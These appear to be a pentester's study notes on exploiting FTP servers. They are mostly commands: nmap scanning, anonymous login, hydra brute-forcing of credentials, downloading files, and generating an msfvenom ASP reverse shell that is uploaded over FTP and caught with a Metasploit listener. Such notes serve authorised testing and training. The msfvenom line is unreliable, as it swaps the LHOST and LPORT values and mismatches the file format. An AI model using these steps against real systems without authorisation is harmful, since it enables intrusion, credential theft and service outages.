FTP runs on port 21 and frequently used as means of transferring files to and from the directiory of a web server.

FTP auth requires a user/pass. As a result, we can perform a brute-force attack on the FTP server in order to identify legit creds

In some cases, FTP servers may be configured to allow anonymous access, which consequently allows anyone to access the FTP server without providing any legit creds.

-----------------------------Exploitation--------------------------------------

nmap -sV <ip>

ftp <ip> (check for anonymous access and just enter / enter on user/pass prompt)
also try using username anonymous and then blank password

ls -al /usr/share/nmap/scripts/ | grep ftp-*
** you can also test for anonymous access with nmap scripts, this command shows you your options**

hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> -t 4 ftp
**-t sets the threads you want to use, brute-forcing typically takes down FTP servers**
ftp <IP>
sysadmin (or any other valuable looking account)
dir (lists directory)
get secret.txt

**you can also use searchsploit to look for the specific version of FTP exploits**
searchsploit proftp

**If you have access to FTP, you can try accessing one of the files from the webbrowser for example 192.168.0.1/example.asp and if it loads then this shows you can
execute files from the FTP directory. This means you can upload a reverse shell to the directory to further your access.
Use MSFVenom to generate the aspx reverse shell**
msfvenom -p windows/shell/reverse_tcp LHOST=<targetIP> LPORT=<listenerIP> -f asp > shell.aspx
put shell.aspx (or whichever is the working directory of the file on your machine) this is to be run while logged into the FTP server to upload it
MSFconsole you can use the listener use/multi/handler and set payload windows/shell/reverse_tcp (the same one you specified in the MSFVenom)
**This still may fail on the web end and fail to run, even though you cant gain a reverse shell, 
the access to the FTP server is already a good point for a penttest, not everything will provide you a way for higher access**
